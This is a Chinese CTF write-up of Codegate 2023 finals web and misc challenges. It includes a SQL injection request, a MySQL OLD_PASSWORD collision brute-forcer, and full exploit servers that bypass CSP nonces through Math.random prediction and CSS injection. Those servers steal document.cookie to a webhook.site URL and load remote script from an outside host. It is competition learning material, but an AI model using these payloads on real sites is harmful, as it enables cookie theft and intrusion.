---
title: Codegate 2023 Partial Write-Up (Web/Misc)
date: 2023-08-29 15:05:06
tags:
- Write-Up
categories:
- CTF
---
# Codegate 2023 部分Write-Up (Web/Misc)

这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记/照片另开一文。  

## Warmup

没咋看。似乎是XSS绕绕。

## Pwn

是的，这题就叫Pwn（与之相对的是Pwn分类里有道题叫Web）  
解法：没咋看。应该是比较水的一题。经典数组绕过  
```python
data = "username[0]=\\' union select password from USER WHERE username='admin' -- &username[1]=2&password=3"
r = requests.post("http://3.35.198.7:2929/login", data=data)
print(r.text)
```

## Cha's magic

源码：
```python
<?php
require_once 'config.php';

function hashPasswordOld($password_to_hash)
{
    global $host, $dbname, $username, $password, $charset;
    try
    {
        $db = new PDO("mysql:host=$host;dbname=$dbname;charset=$charset", $username, $password);

        $query = $db->prepare("SELECT OLD_PASSWORD(:password)");
        $query->execute([':password' => $password_to_hash]);

        $row = $query->fetch(PDO::FETCH_NUM);
        if ($row)
        {
            return $row[0];
        }
    }
    catch(PDOException $ex)
    {
        die("An Error occured!<br>");
    }

    return null;
}

if(isset($_GET["v1"]) && isset($_GET["v2"]))
{
    $v1 = $_GET["v1"];
    $v2 = $_GET["v2"];

    if (substr($v1, 0, 13) !== "codegate2023{" || substr($v1, -11) !== "i_love_you}" ||
        substr($v2, 0, 13) !== "codegate2023{" || substr($v2, -11) !== "i_love_you}") {
        die("fall in love~");
    }

    if($v1 == $v2) die("are you kidding me?");

    $v1 = hashPasswordOld($v1);
    $v2 = hashPasswordOld($v2);
    $v3 = hashPasswordOld($flag);

    if($v3 !== "6368616368613230")
    {
        die("flag verification failed.");
    }

    if($v1 == null or $v2 == null)
    {
        die("What the hell here?");
    }

    if($v1 == $v2)
    {
        if($v2 == $v3)
        {
            die($flag);
        }

        die(substr($flag, 0, strlen($flag) / 2));
    }

    die("Try harder...");
}
show_source(__FILE__);

?>
```
也就是v1和v2和v3经过hash得到的值都一样才能拿到完整flag。  
对于OLD_PASSWORD的算法，网上有很多实现，这里有一个C#版本的：
```Csharp
// Online C# Editor for free
// Write, Edit and Run your C# code using C# Online Compiler

using System;

public class HelloWorld
{
    public static string mysql_old_password(string sPassword)
{
    UInt32[] result = new UInt32[2];
    bool bDebug = false;
    UInt32 nr = (UInt32)1345345333, add = (UInt32)7, nr2 = (UInt32)0x12345671;
    UInt32 tmp;

    char [] password = sPassword.ToCharArray();
    int i;

    for (i = 0; i < sPassword.Length; i++)
    {
        if (password[i] == ' ' || password[i] == '\t')
            continue;

        tmp = (UInt32)password[i];
        nr ^= (((nr & 63) + add) * tmp) + (nr << 8);
        nr2 += (nr2 << 8 ) ^ nr;
        Console.WriteLine("---");
        Console.WriteLine(nr.ToString("X"));
        Console.WriteLine(nr2.ToString("X"));
        Console.WriteLine("---");
        add += tmp;
    }

    UInt32 mask = (((UInt32)1 << 31) - (UInt32)1); // 111....11, 31bits
    result[0] = nr & mask;
    result[1] = nr2 & mask;
    string hash = String.Format("{0:X}{1:X}", result[0], result[1]);
    return hash.ToLower();
}
    public static void Main(string[] args)
    {
        Console.WriteLine (mysql_old_password("aaaaa"));
    }
}
```
可以看到，v1和v2的hash值碰撞只需要加入空格就可以：因为该算法完全忽略空格和制表符。  
这样前一半flag就知道了：`codegate2023{Mysql_olD_P455woRD_I5_CoMP`
核心问题在于使v2的hash值等于`6368616368613230`，v2必须以`i_love_you}`结尾，我们唯一能改变的就是中间的字符串。  
经过搜寻，找到一个帖子：[mysql-old-password-cryptanalysis](https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis)  
里面给出了一段逆向推导nr与nr2的代码，以及一篇分析该算法的论文：F. Muller and T. Peyrin "Cryptanalysis of T-Function-Based Hash Functions" in International Conference on Information Security and Cryptology - ICISC 2006  
不过需要注意的是该论文中的算法和实际算法有一个微小差异：nr2对应公式的`=`应为`+=`。  
逆向计算nr/nr2：
```cpp
#include <bits/stdc++.h>
using namespace std;
void pre(int level = 0)
{
    for (int i = 0; i < level; i++)
        cout << "-";
}
int bruteforce(uint32_t pnr, uint32_t pnr2, uint32_t add, unsigned len, /*debug only!*/ unsigned level = 0);
unsigned char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"; // sorted by ascii
//这里的代码假设只有以上字符存在，事实上完全没有必要：ascii 32-127都可以。
int oldpw_rev(uint32_t pnr, uint32_t pnr2, uint32_t add,
              unsigned char c, unsigned len, /*debug only!*/ unsigned level = 0)
{
    uint32_t nr, nr2;
    uint32_t u, e, y;

    if (len == 0 && add==7 && pnr2==0x12345671) // Modify to target value when MiM-ing
    {
        return 0;
    }
    nr = pnr;
    nr2 = pnr2;
    // c = cc[len - 1];
    add -= c;

    u = nr2 - nr;
    u = nr2 - ((u << 8) ^ nr);
    u = nr2 - ((u << 8) ^ nr);
    nr2 = nr2 - ((u << 8) ^ nr);
    nr2 &= 0x7FFFFFFF;

    y = nr;
    for (e = 0; e < 64; e++)
    { // guess 6 lsb of nr
        uint32_t z, g;

        z = (e + add) * c;
        g = (e ^ z) & 0x3F;
        if (g == (y & 0x3F))
        { // must matches, otherwise reject it
            uint32_t x;

            // Now 8 LSB of nr known, byte-by-byte derive previous nr
            x = e;
            x = y ^ (z + (x << 8));

            x = y ^ (z + (x << 8));
            x = y ^ (z + (x << 8));
            nr = y ^ (z + (x << 8));
            nr &= 0x7FFFFFFF;
            
            if (bruteforce(nr, nr2, add, len - 1, level + 1) == 0)
            {
                cout<<"assume:"<<c<<endl;
                return 0;
            }
        }
    }
    return -1;
}
int bruteforce(uint32_t pnr, uint32_t pnr2, uint32_t add, unsigned len, /*debug only!*/ unsigned level)
{
    if (add-7<48*len||add-7>122*len) return -1;
    for (int _=0;_<63;_++) {
        // Maybe剪枝here
        if (oldpw_rev(pnr,pnr2,add,charset[_],len,level)==0)
        {
            pre(level);
            printf("nr:%x   nr2:%x\n", pnr, pnr2);
            return 0;
        }
    }
    return -1;
}
int main()
{
    //eg: aaaa
    uint32_t pnr = 0xA8D6917A, pnr2 = 0x6FAB63E5; //最终的nr, nr2，来自上文的C#代码
    cout << bruteforce(pnr, pnr2, 97*4 + 7 /*add*/, 4/*length*/) << endl; // ! initial value of add is 7

}
```
也就是，在已知add值（字符串的前缀ASCII和）以及当前字符的情况下，对于平凡情况（无多解），能在常数时间确定上一个nr/nr2对的值。  
一个朴素的思路是暴力枚举当前位的字符与add值。  
暴力计算的话时间复杂度肯定是无法接受的（O(64^n)，5步需要约1分钟）。我们理一下现在已知什么，需要求解什么。请注意：我们需要的只是hash碰撞，不代表flag也是以`i_love_you}`结尾的。
+ v2的形式：`codegate2023{Mysql_olD_P455woRD_I5_CoMP<???>i_love_you}`
+ FLAG的总长度为78-79（因为前一半flag长为39）
+ 最终hash(v2)=`6368616368613230` -> 最终的nr/nr2
+ 前一半flag的add值为3430：`sum([ord(i) for i in "codegate2023{Mysql_olD_P455woRD_I5_CoMP"])`
+ 结尾的11个字符`i_love_you}`对应add值：1207
+ 未知：整个flag字符串的add值
  + 但add值的可能范围很有限，我们可以容易计算出上下界：下界为3430+39\*32=4678，上界为3430+40\*127=8510
  + **并且，这个范围内合法的add值占比并不高：对于一个可能的add值，往回推结尾的那11个字符`i_love_you}`必须都有解**

所以我们只需要MitM，中间相遇，即可爆出正解。  
这个中间状态指的是`<???>`这串未知字串中间某个位置一个独特的nr/nr2/add对；而这个add值毕竟只是一个中间量（**下称fadd**），可以手动给予一个值。在本题中我们手动要求从`codegate2023{Mysql_olD_P455woRD_I5_CoMP<???>i_love_you}`再向前填充总计`6*127`的字符作为中间相遇处：当然越大的值搜索空间越大。  
1. 我们先筛选出可行的add值，并记录在处理`i_love_you}`前的中间add值
2. 逆向: 对于每个中间add值先逆推5步，记录所有可能在中间相遇处add值为fadd的nr/nr2对，以及逆向对应的5个字符
3. 正向: 我们手动要求向前数步（至少6步，因为fadd值是3430+6*127）到达中间相遇处使得add值为fadd，并检查这个nr/nr2对是否出现在逆向得到的结果中；如果有，则拿下。  
爆破代码：Credit to @4qwerty  
为什么for嵌套这么多？因为4老师懒得写递归，反正没几步，不够就加一层for就行了。  
其实如果要计算的话是可以的：逆着5步大约有
```cpp
#include <stdio.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <thread>
#include <mutex>
#include <vector>
#include <unordered_map>
#include <atomic>

static int
oldpw_rev(uint32_t *pnr, uint32_t *pnr2, uint32_t add,
    unsigned char *cc, unsigned len)
{
    uint32_t nr, nr2;
    uint32_t c, u, e, y;

    if (len == 0) {
        return 0;
    }

    nr = *pnr;
    nr2 = *pnr2;
    c = cc[len - 1];
    add -= c;

    u = nr2 - nr;
    u = nr2 - ((u << 8) ^ nr);
    u = nr2 - ((u << 8) ^ nr);
    nr2 = nr2 - ((u << 8) ^ nr);
    nr2 &= 0x7FFFFFFF;

    y = nr;
    for (e = 0; e < 64; e ++) {
        uint32_t z, g;

        z = (e + add) * c;
        g = (e ^ z) & 0x3F;
        if (g == (y & 0x3F)) {
            uint32_t x;

            x = e;
            x = y ^ (z + (x << 8));

            x = y ^ (z + (x << 8));
            x = y ^ (z + (x << 8));
            nr = y ^ (z + (x << 8));
            nr &= 0x7FFFFFFF;
            if (oldpw_rev(&nr, &nr2, add, cc, len - 1) == 0) {
                *pnr = nr;
                *pnr2 = nr2;
                return 0;
            }
        }
    }

    return -1;
}

void forward(unsigned char *cc, unsigned len, uint32_t *nr, uint32_t *nr2, uint32_t *add) {
    uint32_t tmp;
    int i;

    for (i = 0; i < len; i++) {
        if (cc[i] == ' ' || cc[i] == '\t')
            continue;

        tmp = cc[i];
        *nr ^= (((*nr & 63) + *add) * tmp) + (*nr << 8);
        *nr2 += (*nr2 << 8 ) ^ *nr;
        *add += tmp;
    }

    uint32_t mask = (((uint32_t)1 << 31) - (uint32_t)1); // 111....11, 31bits
    *nr &= mask;
    *nr2 &= mask;
    // printf("hash: %x %x\n", *nr, *nr2);
}

void calc(unsigned char *cc, unsigned len, uint32_t *nr, uint32_t *nr2) {
	*nr = 1345345333;
	*nr2 = 0x12345671;
    uint32_t add = 7;
    forward(cc, len, nr, nr2, &add);
}

struct Ans {
    unsigned char buf[6];
};

struct pair_hash
{
    template <class T1, class T2>
    std::size_t operator() (const std::pair<T1, T2> &pair) const {
        return std::hash<T1>()(pair.first) ^ std::hash<T2>()(pair.second);
    }
};

bool ok_maps[65536] = {0}; 

int main() {
    uint32_t nr, nr2;
    unsigned char cp[] = "codegate2023{Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03";
    nr = 1345345333;
	nr2 = 0x12345671;
    uint32_t add = 7;
    forward(cp, strlen((char *)cp), &nr, &nr2, &add);
    printf("nr: %x, nr2: %x, add: %x\n", nr, nr2, add);
    uint32_t fnr = nr, fnr2 = nr2, fadd = add;

    uint32_t uadd = 127 * 6, fuadd = fadd;
    fadd += uadd;

	unsigned char cs[] = "i_love_you}";

    std::vector<std::thread> ths;
    std::mutex mtx;
    std::unordered_map<std::pair<uint32_t, uint32_t>, Ans, pair_hash> maps;
    std::atomic<int> cnter{0};
    for (int i = 500; i < 20000; i++) { // find possible `add` value 
        uint32_t pnr = 0x63686163, pnr2 = 0x68613230;
        int ans = oldpw_rev(&pnr, &pnr2, i, cs, 11);
        if (ans != 0) continue;
        ok_maps[i] = true;
    }
    for (size_t i = 33; i < 127; i++) { 
        ths.emplace_back([&, i] {
            std::vector<std::pair<std::pair<uint32_t, uint32_t>, Ans>> all;
            Ans cc;
            cc.buf[5] = 0;
            cc.buf[4] = i;
            for (size_t c = 33; c < 127; c++) {
                cc.buf[3] = c;
                for (size_t d = 33; d < 127; d++) {
                    cc.buf[2] = d;
                    for (size_t a = 33; a < 127; a++) {
                        int sumer = fadd + i + c + d + a + 1207;
                        cc.buf[1] = a;
                        for (size_t b = 33; b < 127; b++) if (ok_maps[sumer + b]) {
                            cc.buf[0] = b;
                            uint32_t pnr = 0x63686163, pnr2 = 0x68613230;
                            int ans = oldpw_rev(&pnr, &pnr2, fadd + i + c + d + a + b + 1207, cs, 11); // backward: suffix
                            if (ans != 0) continue;
                            ans = oldpw_rev(&pnr, &pnr2, fadd + i + c + d + a + b, cc.buf, 5); // ... and extra 5 steps
                            if (ans != 0) continue;
                            ++cnter; 
                            all.emplace_back(std::make_pair(std::make_pair(pnr, pnr2), cc)); // possible nr/nr2 pair, record it
                        }
                    }
                }
            }
            std::lock_guard<std::mutex> lock(mtx);
            for (auto &&p:all) {
                maps[p.first] = p.second;
            }
        });
    }
    for (auto &&th:ths) th.join();
    ths.clear();
    puts("MITM");
    printf("%d\n", cnter.load());
    for (size_t i = 33; i < 127; i++) { // forward
        ths.emplace_back([&, i] {
            unsigned char buf[50];
            buf[0] = i;
            for (size_t c = 33; c < 127; c++) {
                buf[1] = c;
                for (size_t d = 33; d < 127; d++) {
                    buf[2] = d;
                    for (size_t a = 33; a < 127; a++) {
                        buf[3] = a;
                        for (size_t b = 33; b < 127; b++) {
                            buf[4] = b;
                            for (size_t e = 33; e < 127; e++) {
                                buf[5] = e;
                                int re = uadd - i - c - d - a - b - e;
                                int iter = 6;
                                while (re >= 33) { // padding, to make the `add` value is `fadd`
                                    int tw = re;
                                    if (re > 126) {
                                        tw = 'a';
                                    }
                                    buf[iter++] = tw;
                                    re -= tw;
                                }
                                if (re != 0) continue;
                                buf[iter] = 0;
                                uint32_t nr = fnr, nr2 = fnr2, add = fuadd;
                                forward(buf, iter, &nr, &nr2, &add);
                                auto cc2 = std::make_pair(nr, nr2);
                                if (maps.find(cc2) != maps.end()) { // GOT!!!
                                    printf("%s%s%s%s\n", cp, buf, maps[cc2].buf, cs);
                                    // exit(0);
                                }
                            }
                        }
                    }
                }
            }
        });
    }
    for (auto &&th:ths) th.join();
    return 0;
}
```
## Cha's Diary

非预期了。  
储存型XSS，允许跨域。  
有CSP策略保护，iframe被禁止加载，需要nonce来执行脚本：
`<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; style-src 'unsafe-inline' https://unpkg.com">`  
目标是偷cookie里的flag.  
我们可以利用meta标签进行跳转：  
`<meta http-equiv="refresh" content="1; http://attacker.com">`  
那么我们接下来要做的就是两步：获取nonce—>执行js  

### 获取nonce

正解应该是通过注入CSS，用CSS匹配器匹配nonce属性，逐步获取nonce。  
可能有人会好奇，每次页面刷新不是会重新生成nonce吗？但此题有一个特殊之处：传参方法是通过URL的`#`锚（哈希/frame/...）来传参，并通过页内js动态渲染。因此当前进后退时并不会刷新，**而是调用浏览器缓存。因此nonce不会改变**。  
当时以为有[nonce hiding](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce#description)这种东西，所以没有往下尝试，结果赛后发现这似乎是个饼并未实现……当然，我们的做法是直接在新标签页fetch并拿到页面内容正则匹配，根本就不经过浏览器过滤。  
官方的做法就是使用CSS注入每次偷一位，具体做法见[how-to-bypass-csp-nonces-with-dom-xss](http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
核心部分：
```
The summary of this attack is that it's possible to create a CSS program that exfiltrates the values of HTML attributes character-by-character, simply by generating HTTP requests every time a CSS selector matches, and repeating consecutively. If you haven't seen this working, take a look here. The way it works is very simple, it just creates a CSS attribute selector of the form:

*[attribute^="a"]{background:url("record?match=a")}
*[attribute^="b"]{background:url("record?match=b")}
*[attribute^="c"]{background:url("record?match=c")}
[...]

And then, once we get a match, repeat with:
*[attribute^="aa"]{background:url("record?match=aa")}
*[attribute^="ab"]{background:url("record?match=ab")}
*[attribute^="ac"]{background:url("record?match=ac")}
[...]

Until it exfiltrates the complete attribute.
```
然而我们发现他只使用了`Math.random`来生成随机nonce，这完全是可以预测的：[https://github.com/PwnFunction/v8-randomness-predictor](https://github.com/PwnFunction/v8-randomness-predictor)  
**于是我们新开一个标签页然后多次fetch阅读文章页面拿一堆nonce给预测器，直接就能知道下一个nonce.**  

### 执行JS

nonce已知之后可以直接在自己VPS上发送请求创建笔记。  
接下来要让受害者加载页面才行。这个只需要看`share_read.js`就会发现触发`hashchange`事件即可。由于缓存（前进后退缓存，bfcache）的存在，我们可以在已知nonce的标签页随便开个页面然后`extra.history.go(-1);`，并修改hash值便能再次触发post加载，让已经被回调函数删掉的事件监听器在重新运行的js中焕发第二春。  
这时我们发现单纯插入script标签并不能被执行，因为js脚本是往页面DOM节点写入`innerText`而已。  
经过一番神秘的摸索，大战MDN的manual，我们发现了一个神奇的属性：`<iframe srcdoc="...">`  
在[CSP测试网站](https://csplite.com/csp/test188/)中是这么说的：
```
Content Security Policy: the srcdoc attribute in the iframe tag is not governed by frame-src, but its content is blocked by other directives of the parent page
```

也就是插入时就会执行。至此，我们得以执行插入的js代码。  

### 备注
官方idea来自这篇文章，也是场上找到过的材料：[Chrome Cache to XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss)  
其他一些很有用的材料：[Collection of CSP bypasses](http://sebastian-lekies.de/csp/bypasses.php)
CSP相关测试的网站：[https://csplite.com/csp/](https://csplite.com/csp/)  
随机数预测解法的完整服务端代码：
```python
#!/usr/bin/python3

import struct, time
from hashlib import md5
from tqdm import trange

alphabet =  'abcdefghijklmnopqrstuvwxyz0123456789'

def generate_same_for(alphabet):
    sames_for = []
    alphas = len(alphabet)
    for i in range(alphas):
        start = i / alphas
        end = (i + 1) / alphas
        float_begin = struct.pack("d", start + 1)
        float_end = struct.pack("d", end + 1)
        uint_begin = struct.unpack("<Q", float_begin)[0] & ((1 << 52) - 1)
        uint_end = (struct.unpack("<Q", float_end)[0] - 1) & ((1 << 52) - 1)
        x, y = bin(uint_begin)[2:].zfill(52), bin(uint_end)[2:].zfill(52)
        sames = 0
        while x[sames] == y[sames]:
            sames += 1
        sames_for.append((int(x[:sames], 2) if sames else 0, sames))
    return sames_for

sames_for = generate_same_for(alphabet)

def solve(question, alphabet, sames_for):
    sequence = [alphabet.index(i) for i in question]
    def test_solution(prefix_count):
        def make_left_shift(state, n):
            return state[n:] + [0]*n
        def make_right_shift(state, n):
            return [0]*n + state[:-n]
        def make_xor(s1, s2):
            return [s1[i]^s2[i] for i in range(64)]
        As = []
        bs = []
        def add_equs(ss, vals, cnt):
            nonlocal As, bs
            for i in range(cnt):
                As.append(ss[i])
                bs.append((vals>>(cnt-1-i))&1)
        matched = 0
        cur = 0
        se_state0 = [1<<i for i in range(64)]
        se_state1 = [1<<i for i in range(64, 128)]
        while matched < len(sequence):
            for i in range(64):
                se_s1 = se_state0
                se_s0 = se_state1
                se_state0 = se_s0
                se_s1 = make_xor(se_s1, make_left_shift(se_s1, 23))
                se_s1 = make_xor(se_s1, make_right_shift(se_s1, 17))
                se_s1 = make_xor(se_s1, se_s0)
                se_s1 = make_xor(se_s1, make_right_shift(se_s0, 26))
                se_state1 = se_s1
                correct_index = 64 - 1 - i + cur - prefix_count
                if correct_index >= 0 and correct_index < len(sequence):
                    uu = sames_for[sequence[correct_index]]
                    add_equs(se_state0, uu[0], uu[1])
                    matched += 1
            cur += 64
        BAs = [0]*128
        Bbs = [0]*128
        for i in range(len(As)):
            A, b = As[i], bs[i]
            listed = False
            for j in range(128):
                if not ((A>>j)&1):
                    continue
                if BAs[j] == 0:
                    BAs[j] = A
                    Bbs[j] = b
                    listed = True
                    break
                else:
                    A ^= BAs[j]
                    b ^= Bbs[j]
            if not listed and b:
                return False
        for i in range(128)[::-1]:
            assert BAs[i] != 0
            for j in range(i + 1, 128):
                if (BAs[i]>>j)&1:
                    Bbs[i] ^= Bbs[j]
        se_state0 = int(''.join([str(i) for i in Bbs[:64]]), 2)
        se_state1 = int(''.join([str(i) for i in Bbs[64:]]), 2)
        generated = 0
        full = []
        while generated < len(sequence) + prefix_count + 128:
            cached = []
            for i in range(64):
                se_s1 = se_state0
                se_s0 = se_state1
                se_state0 = se_s0
                se_s1 ^= (se_s1 << 23) & 0xffffffffffffffff
                se_s1 ^= se_s1 >> 17
                se_s1 ^= se_s0
                se_s1 ^= se_s0 >> 26
                se_state1 = se_s1
                cached.append(struct.unpack("d", struct.pack("<Q", (se_state0 >> 12) | 0x3FF0000000000000))[0] - 1)
            generated += 64
            full += cached[::-1]
        full = full[prefix_count:]
        full = ''.join([alphabet[int(v * len(alphabet))] for v in full])
        assert full[:len(sequence)] == question
        ans = full[len(sequence):][:128]
        return ans

    for i in range(64):
        ret = test_solution(i)
        if ret:
            return ret
    raise Exception('no solution')

import requests
from bs4 import BeautifulSoup

sess = requests.Session()

def login(username, password):
    global sess
    sess = requests.Session()
    url = 'http://3.37.109.189:8080/login'
    sess.post(url, data={
        'username': username,
        'password': password
    })

def write(title, content):
    url = 'http://3.37.109.189:8080/write'
    r = sess.post(url, data={
        'title': title,
        'content': content
    })

def share(id=0):
    url = 'http://3.37.109.189:8080/share_diary/0'
    r = sess.get(url)

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
    <head></head>
    <body>
        <script>
            const genNonce = () => "_".repeat(8).replace(/_/g,()=>"abcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.random()*36));
            async function cc() {
                const url = 'http://localhost'
                let code = '';
                for (let i = 0; i < 15; i++) {
                    let resp = await fetch('http://3.37.109.189:8080' + '/share/read');
                    let text = await resp.text();
                    code += text.match(/nonce-[0-9a-z]+/)?.at(0).replace('nonce-', '');
                }

                const userId = genNonce();
                let extra = open(url + '/share/read#id=0&username=' + encodeURIComponent(userId)) // will NOT throw exception if not created
                console.log(code);
                let resp = await fetch('/solve?q=' + encodeURIComponent(code) + '&u=' + encodeURIComponent(userId)); // get predicted nonce from server (with note created)
                let text = await resp.text();

                setTimeout(()=>{
                    extra.location.href = "http://" + location.host + "/solve";
                    setTimeout(()=>{
                        extra.history.go(-1); // reload, but with bfcache so that nonce won't change, and refresh the `hashchange` event trigger that has been deleted
                        setTimeout(()=>{
                            extra.location.href = url + '/share/read#id=0&username=' + encodeURIComponent(userId)+'&34sdctycv'; // trigger `hashchange`
                    },1000)
                    },1000)
                }, 1000);

            }
            cc().catch((e)=>{fetch('https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/'+e.toString())});
        </script>
    </body>
</html>
'''

@app.route('/solve', methods=['GET', 'POST'])
def sol():
    question = request.form.get('q')
    if not question:
        question = request.args.get('q')
    if not question:
        return "no question"
    ans = solve(question, alphabet, sames_for)
    print(ans)
    user = request.args.get('u')
    login(user, user)
    write('test', f'<iframe srcdoc="<script nonce={ans[:16]}>fetch(`https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/?a=`+document.cookie)</script>"><iframe>')
    share()
    return 'hello'

app.run('0.0.0.0', 5000)
```
附官方WP（使用socket进行通信持续控制页面，基于事件触发需要的更新，攻击者动态返回所需CSS）:
```python
from flask import Flask,request
from flask_socketio import SocketIO
import urllib.parse
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'test1234'
socketio = SocketIO(app,cors_allowed_origins="*")
nonce = ""
self_url = "http://141.164.55.51:8000/gen_exfil_css?nonce="
s = "abcdefghijklmnopqrstuvwxyz0123456789"

@socketio.on('start')
def handle_my_custom_event(methods=['GET', 'POST']):
    print('start')
    socketio.emit('nonce', json.dumps({"nonce":nonce}))

@app.route('/')
def index():
    return """<html>
    <head>
<script src="https://cdn.socket.io/4.3.2/socket.io.min.js" integrity="sha384-KAZ4DtjNhLChOB/hxXuKqhMLYvx3b5MlT55xPEiNmREKRzeEm+RVPlTnAn0ajQNs" crossorigin="anonymous"></script>
</head>
<body>
<script>
    var socket
    var isRun = 0;
    var nonce = ""
    var a,b = undefined;
    idx = -1;
    function sleep(ms) {
        return new Promise((r) => setTimeout(r, ms));
    }
    async function make_shared_note(nonce) {
        make_note = window.open(`http://141.164.55.51:8000/gen_exfil_css?nonce=${nonce}`);
        idx = idx + 1;
        await sleep(400)
        make_note.location = `http://localhost/share_diary/${idx}`
        await sleep(400)
        make_note.close()
    }

    async function exploit(nonce) {
        make_note = window.open(`http://141.164.55.51:8000/exploit?nonce=${nonce}`);
        idx = idx + 1;
        await sleep(400)
        make_note.location = `http://localhost/share_diary/${idx}`
        await sleep(400)
        make_note.close()
    }

    function start() {
        socket = io.connect('http://141.164.55.51:8000');
        socket.on('connect', function() {
        console.log('start');
        socket.emit( 'start', {
            data: 'start'
        })
        })
        

    socket.on('nonce', async function(data) {
        if(!isRun) {
        isRun = 1;
        if(JSON.parse(data).nonce.length==16){
            await exploit(JSON.parse(data).nonce);
            try {
                a.onload = 1
            } catch {
                a.location = "http://ssrf.kr/redirect_cg.html"
            }
            await sleep(400);
            a.location.href = `http://localhost/share/read#id=${idx}`
            a.focus();
            a.focus();
        }
        else if(nonce <= JSON.parse(data).nonce){
            nonce = JSON.parse(data).nonce
            await make_shared_note(nonce);
            console.log(nonce);
            if(!b) {
                b = window.open("about:blank")
                a = window.open("http://localhost/share/read")
                await sleep(400)
                b.location.href = "http://localhost/share/read"
            }
            try {
                a.onload = 1
            } catch {
                a.location = "http://ssrf.kr/redirect_cg.html"
            }
            await sleep(400);
            a.location.href = `http://localhost/share/read#id=${idx}`
            a.focus();
            a.focus();
        }
        isRun = 0;
        } else {
        }
    });
    }
    chall_url = "http://localhost/"
    start();
</script>
</body>

</html>

"""

@app.route('/exploit')
def exploit():
    nonce = request.args.get('nonce')
    payload = f"""<iframe srcdoc="<script nonce={nonce} src=//ssrf.kr/ex.js></script>"></iframe>"""
    return f"""<body onload="form.submit()">
<form id='form' action="http://localhost/write", method="POST">
<input type="text" name="title" value="exploit"/>
<input name="content" value='{payload}'>
</form>
</body>
"""


@app.route('/gen_exfil_css')
def css():
    global nonce
    if len(nonce)<=len(request.args.get('nonce')):
        nonce = request.args.get('nonce')
        app.logger.info(nonce)
        rules = []
        for c in s:
            rules.append(
                """script[nonce^="{nonce}{c}"] {{ background-image: url({self_url}{ce}) !important}}""".format(
                    nonce=nonce, self_url=self_url, c=c, ce=nonce+ urllib.parse.quote(c)
                )
            )
        rules_str = "\n".join(rules)
        payload = """<style>* {{ display: block !important; }}{rules_str}</style>""".format(rules_str=rules_str)
        socketio.emit('nonce', json.dumps({"nonce":nonce}))
        return f"""<body onload="form.submit()">
<form id='form' action="http://localhost/write", method="POST">
<input type="text" name="title" value="exploit"/>
<input name="content" value='{payload}'>
</form>
</body>
"""
    else:
        socketio.emit('nonce', json.dumps({"nonce":nonce}))
        return "asdf"
    

if __name__ == "__main__":
    socketio.run(app, host='0.0.0.0',port=8000 ,debug=True)
```

### 乐子
很多队都是使用随机数预测直接破的。主办方表示：  
![notcrypto](lezi.png)

## 0day

利用路径穿越写maildev的lib/router.js增加自定义路由。  
调用：把服务打挂（例如试图写/flag或者/etc/passwd什么的），重启的时候就会加载。  